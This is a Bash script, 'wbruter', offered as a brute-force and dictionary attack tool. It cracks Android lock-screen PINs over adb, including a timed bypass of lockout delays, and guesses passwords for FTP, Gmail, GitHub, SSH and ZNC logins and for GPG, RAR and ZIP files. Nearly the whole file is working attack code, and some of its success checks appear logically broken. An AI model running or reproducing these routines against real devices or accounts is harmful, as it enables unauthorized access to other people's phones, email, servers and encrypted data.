#!/bin/bash

# - iNFO -----------------------------------------------------------------------------
#
#        Author: wuseman <wuseman@nr1.nu>
#      FileName: wbruter.sh
#       Version: v3.0
#
#       Created: 2018-16 (23:53:08)
#      Modified: 
#
#           iRC: wuseman (Libera/EFnet/LinkNet) 
#       Website: https://www.nr1.nu/
#        GitHub: https://github.com/wuseman/
#
# - LiCENSE -------------------------------------------------------------------------
#
#      Copyright (C) 2022, wuseman                                     
#                                                                       
#      This program is free software; you can redistribute it and/or modify 
#      it under the terms of the GNU General Public License as published by 
#      the Free Software Foundation; either version 3 of the License, or    
#      (at your option) any later version.                                  
#                                                                       
#      This program is distributed in the hope that it will be useful,      
#      but WITHOUT ANY WARRANTY; without even the implied warranty of       
#      MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        
#      GNU General Public License for more details.                         
#                                                                       
#      You must obey the GNU General Public License. If you will modify     
#      the file(s), you may extend this exception to your version           
#      of the file(s), but you are not obligated to do so.  If you do not   
#      wish to do so, delete this exception statement from your version.    
#      If you delete this exception statement from all source files in the  
#      program, then also delete it here.                                   
#
#      You should have received a copy of the GNU General Public License
#      along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# - End of Header --------------------------------------------------------------------

androiddebug() {
    case $(adb devices | awk '{print $2}' | sed 1d | sed '$d') in
        "unauthorized") echo "* You must enable usb-debugging in developer settings." ;;
    esac
}

android_status() {
    ADBW=$(adb devices | sed -n '2p'|awk '{print $2}' | sed 's/device/normal/g')
    ADBF="$(fastboot devices | grep fastboot|awk '{print $2}')"
    ADBOFF="$(adb devices | sed -n 2p)"
    if [[ $ADBW = "normal" ]]; then
        echo "normal" > $(pwd)/.wbruter-status
    elif [[ $ADBW = "unauthorized" ]]; then
        echo " * Please allow this pc to authorize" > $(pwd)/.wbruter-status
    elif [[ $ADBW = "recovery" ]]; then
        echo "recovery" > $(pwd)/.wbruter-status
    elif [[ $ADBF = "fastboot" ]]; then
        echo "fastboot" > $(pwd)/.wbruter-status
    else
        echo "* No device connected.."
        exit
    fi

adb devices |sed -n 2p|grep una &> /dev/null
if [[ $? -eq "0" ]]; then
    echo "* Your device has not been authorized with this pc, aborted."
    exit
fi

}

adbexist() {
    adb="$(which adb 2> /dev/null)"
    distro="$(cat /etc/os-release | head -n 1 | cut -d'=' -f2 | sed 's/"//g')"

    if [ -z "$adb" ]; then
        printf "+ You must install \e[1;1madb\e[0m package before you can attack by this method.\n" 
        read -p "Install adb (Y/n) " adbinstall
    fi

    case $adbinstall in
        "Y")
            echo -e "\nPlease wait..\n"
            sleep 1
            case $distro in
                "Gentoo")
                    echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
                    emerge --ask android-tools ;;
                "Sabayon")
                    echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
                    emerge --ask android-tools ;;
                "Ubuntu")
                    echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
                    apt update -y; apt upgrade -y; apt-get install adb ;;
                "Debian")
                    echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
                    apt update -y; apt upgrade -y; apt-get install adb ;;
                "Raspbian")
                    echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
                    apt update -y; apt upgrade -y; apt-get install adb ;;
                "Mint")
                    echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
                    apt update -y; apt upgrade -y; apt-get install adb ;;
                "no") echo "Aborted." ;
                    exit 0 ;;
            esac
            echo -e "This tool is not supported for $distro, please go compile it from source instead...\n"
    esac
}

multidevices() {
    ADBTOT="$(adb devices | sed 1d|head -2|grep device|wc -l)"

    if [[ $ADBTOT -gt "1" ]]; then
        echo "You have more then one device connected, please choose one of:" 
        #    echo $(adb devices| awk '{print NR-1 " - " $0}'|sed "1d;$d"|awk '{print $1 ")", $3}'|sed '$d';) 
        exit 1
    fi
}

android_usage() {
    if [[ -z $1 ]];then
        STATUS=$(cat $(pwd)/.wbruter-status)
        rm $(pwd)/.wbruter-status
        if [[ $STATUS = "normal" ]]; then
cat << EOF
usage: $0 [-a 4|6] [--android 4|6] [--android-gui 4|6]
    ./wbruter.sh --android 4        | BruteForce android device 4 digits pinCode
    ./wbruter.sh --android 6        | BruteForce android device 6 digits pinCode
    ./wbruter.sh --android-gui 4    | BruteForce android device via lockscreen/gui 4 digits pinCode
    ./wbruter.sh --android-gui 6    | BruteForce android device via lockscreen/gui 6 digits pinCode
EOF
exit 1
        fi
    else
        printf "Your device must be in normal mode when attacking pin code\n"
    fi
}

android4() {
    cr=`echo $'\n.'`
    cr=${cr%.}
    printf "%52s\n" | tr ' ' '-'
    echo -e "Bruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime.."
    printf "%52s\n" | tr ' ' '-'
    for i in {0000..9999}; do
        if [[ -z $(adb shell locksettings clear --old $i | grep "Lock credential cleared") ]]; then
            printf "Wrong PIN: \e[1;31m$i\e[0m\n"
        else
            printf "\nPIN Code Has Been Found: \e[1;32m$i\e[0m\n\n"
            printf "Do you want to set a new PIN "; read -p "(y/N): " newpin
            case $newpin in
                y)
                    read -p "Pin: " newpin2
                    adb shell locksettings set-pin $newpin2
                    printf "\nIt is required to restart your device after\n"
                    printf "PIN code has been set after old pin was erased..\n\n"
                    ;;
                N)
                    printf "\nIt is required to restart your device after\n"
                    printf "PIN code has been erased from your device..\n\n";
                    ;;
            esac
            read -p "restart device (y/N): " rebootornot
            case $rebootornot in
                y) adb shell reboot; printf "\nRebooting device, use pin '$newpin2' for unlock device..\n\n" ;;
                N) printf "\nPin was cracked by wbruter v1.5\n\n";exit 0 ;;
            esac
            exit
        fi
    done
}

android6() {
    cr=`echo $'\n.'`
    cr=${cr%.}
    printf "%52s\n" | tr ' ' '-'
    echo -e "Bruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime.."
    printf "%52s\n" | tr ' ' '-'
    for i in {000000..999999}; do
        if [[ -z $(adb shell locksettings clear --old $i | grep "Lock credential cleared") ]]; then
            printf "Wrong PIN: \e[1;31m$i\e[0m\n"
        else
            printf "\nPIN Code Has Been Found: \e[1;32m$i\e[0m\n\n"
            printf "Do you want to set a new PIN "; read -p "(y/N): " newpin
            case $newpin in
                y)
                    read -p "Pin: " newpin2
                    adb shell locksettings set-pin $newpin2
                    printf "\nIt is required to restart your device after\n"
                    printf "PIN code has been set after old pin was erased..\n\n"
                    ;;
                N)
                    printf "\nIt is required to restart your device after\n"
                    printf "PIN code has been erased from your device..\n\n";
                    ;;
            esac
            read -p "restart device (y/N): " rebootornot
            case $rebootornot in
                y) adb shell reboot; printf "\nRebooting device, use pin '$newpin2' for unlock device..\n\n" ;;
                N) printf "\nPin was cracked by wbruter v1.5\n\n";exit 0 ;;
            esac
            exit
        fi
    done
}


androidgui4() {
    screen="$(adb shell dumpsys nfc | grep 'mScreenState=')"
    case $screen in
        "mScreenState=OFF") echo -e "Preparing to attack."; 
            echo -e "All Has Been Set" ;;
        "mScreenState=ON_UNLOCKED") adb shell input keyevent 26
    esac
    echo -e "Bruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime.."
    adb shell input keyevent 82
    adb shell input swipe 407 1211 378 85
    for i in {0000..9999}; do
        echo -e "\e[0;1mTrying pin:  $i\e[0m"
        for (( j=0; j<${#i}; j++ )); do
            adb shell input keyevent $((`echo ${i:$j:1}`+7))
        done
        adb shell input keyevent 66
        adb shell input swipe 407 1211 378 85
        clear() {
            adb shell input keyevent KEYCODE_MOVE_END
            adb shell input keyevent --longpress $(printf 'KEYCODE_DEL %.0s' {1..250}); } ;clear
            if ! (( `expr $i + 1` % 4 )); then
                adb shell input keyevent 66
                sleep 30
                adb shell input keyevent 82
                adb shell input swipe 407 1211 378 85
            fi
        done
    }

androidgui6() {
    screen="$(adb shell dumpsys nfc | grep 'mScreenState=')"
    case $screen in
        "mScreenState=OFF") echo -e "Preparing to attack."; 
            echo -e "All Has Been Set" ;;
        "mScreenState=ON_UNLOCKED") adb shell input keyevent 26
    esac
    echo -e "Bruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime.."
    adb shell input keyevent 82
    adb shell input swipe 407 1211 378 85
    for i in {000000..999999}; do
        echo -e "\e[0;1mTrying pin:  $i\e[0m"
        for (( j=0; j<${#i}; j++ )); do
            adb shell input keyevent $((`echo ${i:$j:1}`+7))
        done
        adb shell input keyevent 66
        adb shell input swipe 407 1211 378 85
        clear() {
            adb shell input keyevent KEYCODE_MOVE_END
            adb shell input keyevent --longpress $(printf 'KEYCODE_DEL %.0s' {1..250}); } ;clear
            if ! (( `expr $i + 1` % 4 )); then
                adb shell input keyevent 66
                sleep 30
                adb shell input keyevent 82
                adb shell input swipe 407 1211 378 85
            fi
        done
    }

ftpattack() {
    which ftp &> /dev/null
    if [[ $? -eq "1" ]]; then
        echo "+ You must install \e[1;1mftp\e[0m package before you can attack by this method, aborted\n" 
        exit 0
    fi

    re='^[0-9]+$'
    read -p "FTP Username: " username; if [[ -z $username ]]; then echo "You must enter a username, aborted"; exit 0;fi
    read -p "FTP Host: " host; if [[ -z $host ]];then echo "You must enter a hostname or ip number, aborted";exit 0;fi
    read -p "FTP Port: " port;if [[ -z $port ]];then echo "You must enter a port, aborted.";exit 0;fi
    if ! [[ $port =~ $re ]];then echo "That's not a valid port, aborted" >&2; exit 1;fi
    read -p "Wordlist: " wordlist;if [[ -z $wordlist ]]; then echo "You must enter a a wordlist";exit 0;fi
    if [[ ! -f $wordlist ]];then echo "Can't find $wordlist, aborted"; exit 0;fi


    printf "\n====================================================="
    printf "\nBruteforce attack will be started within 2 seconds..\n"
    printf "Please use (CTRL+C) to abort the attack at anytime..\n"
    printf "=====================================================\n"
    sleep 2
    while read line; do
        ftpbrute=$(curl -su $username:$line ftp://$host:$port)
        if [[ -n "$ftpbrute"  ]]; then
            echo -e "====================================================="
            echo -e "Password for $username has been found: \e[1;32m$line\e[0m"
            echo -e "=====================================================\n"
            exit 0
        else
            echo -e "Wrong password for $user: \e[1;31m$line\e[0m"
        fi
    done < $wordlist
    echo -e "====================================================="
    echo -e "No password in $wordlist matched $username password.."
    echo -e "=====================================================\n"
}

gmailattack() {
    requirements_gmail() {
        if [[ -n $(curl -v &> /dev/null) ]]; then echo "Curl is required for this tool, aborted."; exit 1;fi }
            gmail_attack() {
                if [[ -n $(curl -v &> /dev/null) ]]; then echo "Curl is required for this tool, aborted."; exit 1;fi; read -p $'Email: ' mail
                    if [[ ! "$mail" =~ ^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}$ ]]; then echo -e "Error: email address $email is invalid, aborted."; exit 0;fi
                    read -p $'Wordlist: ' wordlist
                    if [[ ! -a $wordlist ]]; then echo "Error: There is no such wordlist, aborted"; exit 0; fi

                    printf "\n"
                    printf "IP: $(curl -s https://nr1.nu/i/)\n"
                    printf "Target: $mail\n"
                    printf "Wordlist: $(pwd)/$wordlist\n\n"
                    read -p $'If everything looks ok, hit enter to start the brute attack: ' ready
                    if [[ -z $ready ]]; then
                        printf "Bruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime..\n"
                        while read -r line; do
                            name="$line"
                            attack="$(curl -s -u $mail:$name https://mail.google.com/mail/feed/atom | grep 'xml')"
                            if [[ -n "$attack" ]]; then
                                printf "\n\nWrong Password for $mail: \e[1;31m$name\e[0m\n"
                            fi

                            if [ -n "$attack" ]; then
                                printf "%88s\n" | tr ' ' '-'
                                echo -e  "Password Has Been Found: $name"
                                printf "%88s\n" | tr ' ' '-'
                                exit
                            fi
                        done < "$wordlist"
                        printf "\n\nSorry, no passwords in $wordlist matched $mail current password. \n\n"
                        printf "Try with another wordlist...\n\n"
                        exit
                    else
                        printf "Aborted.\n"
                        printf "%88s" | tr ' ' '-'
                    fi
                }
                requirements_gmail
                gmail_attack
            }

gpgattack() {
    which gpg &> /dev/null
    if [[ $? -eq "1" ]]; then
        printf "You must install 'gpg' package, aborted" 
        exit 0
    fi

    read -p "GPG File: " GPG_FILE
    read -p "Wordlist: " WORDLIST
    echo -e ""
    echo -e "Target File: $GPG_FILE"
    echo -e "Wordlist: $WORDLIST"
    echo -e ""
    read -p $'If everything looks ok, type yes to begin the brute attack: (yes/no): ' ready
    if [ $ready = "yes" ]; then
        echo -e "Bruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime..\n"
        for word in $(cat $WORDLIST); do 
            echo $word | gpg --passphrase-fd 0 -q --batch --allow-multiple-messages --no-tty  --output $GPG_FILE -d $GPG_FILE 2> /dev/null
            echo -e "Wrong password: \e[1;31m$word\e[0m"
        done;
        if [ $? = "0" ]; then
            echo "--------------------------------------"
            echo -e "GPG passphrase: \e[1;32m${word}\e[0m";
            echo "--------------------------------------"
            exit 0;
        fi

    fi
}

rarattack() {
    if [[ -n $(unrar -v &> /dev/null) ]]; then
        echo "unrar is required for this tool, aborted."
        exit 1
    fi

    wordlist="wordlist"
    read -p "RAR Filename: (/path/to/file.rar): " rartarget

    if [ ! -f $wordlist ]; then
        printf "Can't find $wordlist, aborted\n"
        exit
    fi

    if [[ ! -a $rartarget ]]; then
        printf "Sorry, can't $rartarget a such file, aborted\n"
        exit
    fi
    printf "\n%51s" | tr ' ' '='
    printf "\nBruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime..\n"
    printf "%51s\n" | tr ' ' '='
    sleep 2
    while read line; do
        echo "$line" | unrar p $rartarget &> /dev/null
        if [[ $? = "0" ]]; then
            printf "%51s" | tr ' ' '='
            printf "\nPassword has been found: \e[1;32m$line\e[0m"
            printf "\n%51s\n\n" | tr ' ' '='
        else
            printf "Wrong password: \e[1;31m$line\e[0m\n"
        fi
    done < wordlist
}

sshattack() {
    sshpass -v &> /dev/null
    if [[ ! $? = "0" ]]; then echo "sshpass is required to be installed, aborted"; exit 0; fi
    pssh --help &> /dev/null
    if [[ ! $? = "0" ]]; then echo "pssh is required to be installed, aborted"; exit 0; fi

    read -p "Hostfile: " hostfile
    read -p "Username: " username
    read -p "Password " wordlist

    printf "=====================================================\n"
    printf "Bruteforce attack will be started within 2 seconds..\n"
    printf "Please use (CTRL+C) to abort the attack at anytime..\n"
    printf "=====================================================\n"
    while read line; do
        if [[ -n $(sshpass -f $wordlist pssh -v "-o StrictHostKeyChecking=no" -I -A -p 10 -h $hostfile -l $username -i "uptime" < $wordlist  | grep SUCCESS) ]]; then
            printf "Password has been found for $username: $line"
        else
            echo "Wrong password for $username: $line"
        fi
    done < $wordlist
}

zipattack() {
    read -p "ZiP File: " zippie
    read -p "Wordlist: " wordish
    printf "%50s\n" | tr ' ' '='
    while read line; do
        unzip -P $line -o $zippie &> /dev/null
        if [[ $? -eq 1 ]]; then
            printf "Wrong password: \e[1;31m$line\e[0m\n"
        else
            printf "%50s\n" | tr ' ' '='
            printf "Password Found: \e[1;32m$line\e[0m\n"
            printf "%50s\n" | tr ' ' '='
            exit
        fi
    done < $wordish
    printf "%50s\n" | tr ' ' '='
    echo "No password matched in $wordish - Try another wordlist"
    printf "%50s\n" | tr ' ' '='
}


zncattack() {
    read -p "ZNC User: " zuser
    if [[ -z $zuser ]]; then
        echo "You must enter a username, aborted"
        exit 0
    fi

    read -p "ZNC Host: " zhost
    if [[ -z $zhost ]]; then
        echo "You must enter a hostname or ip number, aborted"
        exit 0
    fi

    read -p "ZNC Port: " zport
    if [[ -z $zport ]]; then
        echo "You must enter a port, aborted."
        exit 0
    fi

    if ! [[ $zport =~ $re ]] ; then
        echo "That's not a valid port, aborted" >&2; exit 1
    fi

    read -p "ZNC Wordlist: " zwordlist
    if [[ -z $zwordlist ]]; then
        echo "You must enter a a wordlist"
        exit 0
    fi

    if [[ ! -f $zwordlist ]]; then
        echo "Can't find $zwordlist, aborted"
        exit 0
    fi

    printf "\n====================================================="
    printf "\nBruteforce attack will be started within 2 seconds..\n"
    printf "Please use (CTRL+C) to abort the attack at anytime..\n"
    printf "=====================================================\n"
    while read line; do
        curl -s https://$zhost:$zport --user $zuser:$line | grep Unauthorized &> /dev/null
        if [[ "$?" -gt "0" ]]; then
            sleep 1
            echo -e "====================================================="
            echo -e "Password for $zuser has been found: \e[1;32m$line\e[0m"
            echo -e "=====================================================\n"
            exit 0
        else
            echo -e "Wrong password for $zuser: \e[1;31m$line\e[0m"
        fi
    done < $zwordlist
}

github() {
    read -p "User: " user
    read -p "Wordlist: " wordlist

    if [[ ! -f $wordlist ]]; then
        echo "Can't find a such wordlist, aborted"
        exit 0
    fi

    printf "\n====================================================="
    printf "\nBruteforce attack will be started within 2 seconds..\n"
    printf "Please use (CTRL+C) to abort the attack at anytime..\n"
    printf "=====================================================\n"

    while read line; do
        curl -su $user:$line -X GET https://api.github.com|grep -iq 'Bad'
        if [[ $? -gt "0" ]]; then
            printf "\nFound password for $user: \e[1;32m$line\e[0m\n\n"
            exit 1
        else
            printf "Wrong password for $user: \e[1;31m$line\e[0m\n"
        fi
    done < $wordlist
    printf "%50s\n" | tr ' ' '='
    echo "No password matched in $wordish - Try another wordlist"
    printf "%50s\n" | tr ' ' '='
}


if [[ $1 = "--android" && $2 = "4" ]] || [[ $1 = "-a" && $2 = "4" ]]; then
    androiddebug
    adbexist
    android_status
    multidevices
    android4
elif [[ $1 = "--android" && $2 = "6" ]] || [[ $1 = "-a" && $2 = "6" ]]; then
    androiddebug
    adbexist
    android_status
    multidevices
    android6
elif [[ $1 = "--android-gui" && $2 = "4" ]] || [[ $1 = "-A" && $2 = "4" ]]; then
    androiddebug
    adbexist
    android_status
    multidevices
    androidgui4
elif [[ $1 = "--android-gui" && $2 = "6" ]] || [[ $1 = "-A" && $2 = "6" ]]; then
    androiddebug
    adbexist
    android_status
    multidevices
    androidgui6
elif [[ $1 = "--android" && ! $2 = "4" ]] || [[ $1 = "-a" && ! $2 = "4" ]]; then
    androiddebug
    adbexist
    android_status
    multidevices
    android_usage
elif [[ $1 = "--android" && ! $2 = "6" ]] || [[ $1 = "-a" && ! $2 = "6" ]]; then
    androiddebug
    adbexist
    android_status
    multidevices
    android_usage
elif [[ $1 = "--android-gui" && ! $2 = "4" ]] || [[ $1 = "-A" && ! $2 = "4" ]]; then
    androiddebug
    adbexist
    android_status
    multidevices
    android_usage
elif [[ $1 = "--android-gui" && ! $2 = "6" ]] || [[ $1 = "-A" && ! $2 = "6" ]]; then
    androiddebug
    adbexist
    android_status
    multidevices
    android_usage
elif [[ $1 = "-f" || $1 = "-ftp" || $1 = "--f" || $1 = "--ftp" ]]; then
    ftpattack
elif [[ $1 = "-gi" || $1 = "-github" || $1 = "--gi" || $1 = "--github" ]]; then
    github
elif [[ $1 = "-g" || $1 = "-gmail" || $1 = "-g" || $1 = "--gmail" ]]; then
    gmailattack
elif [[ $1 = "-G" || $1 = "-gpg" || $1 = "--G" || $1 = "--gpg" ]]; then
    gpgattack
elif [[ $1 = "-r" || $1 = "-rar" || $1 = "--r" || $1 = "--rar" ]]; then
    rarattack
elif [[ $1 = "-s" || $1 = "-ssh" || $1 = "--ssh" || $1 = "--s" ]]; then
    sshattack
elif [[ $1 = "-v" || $1 = "-version" || $1 = "--version" || $1 = "--v" ]]; then
    printf "\nYou are using $basename$0 $VERSION wich was released $RELEASEDATE\n"
    printf "\nLatest version of WBRUTER will allways be available on: github.com/wuseman/WBRUTER\n\nDo you have any suggestions of rare protocols that should be added under wbruter, then send me an email\n\nThanks for using WBRUTER\n\n"
elif [[ $1 = "-z" || $1 = "-zip" || $1 = "--zip" || $1 = "--z" ]]; then
    zipattack
elif [[ $1 = "-Z" || $1 = "-znc"  || $1 = "--Z" || $1 = "--ZNC" ]]; then
    zncattack
else

cat << EOF
  BruteForce Attack: 
    usage: $0 [-a 4|6] [--android 4|6] [--android-gui 4|6]
    
        -a|--android     4|6    | BruteForce android device 4 o 6 digits pinCode
        -A|--android-gui 4|6    | BruteForce android device via lockscreen/gui 4 digits pinCode
  Dictionary Attack:
    usage: $0 [--ftp] [--gmail] [--github] [--gpg] [--rar] [--ssh] [--zip] [--znc]
        
        --ftp                   | Dictionary attack for crack password for on a ftp server (ftps is supported)
        --gmail                 | Dictionary attack for crack password for any gmail account
        --github                | Dictionary attack for github accounts via web
        --gpg                   | Dictionary attack for break the encryption of GPG encrypted files protected by a passphrase
        --rar                   | Dictionary attack for break the encryption of rar files
        --ssh                   | Dictionary attack for crack ssh passphrase on any ssh server via parallel ssh (all versions supported)
        --zip                   | Dictionary attack a zip encryptedfile, brute force mode is enable for ZIP files
        --znc                   | Dictionary attack for ZNC bouncer's web loginn
EOF

fi
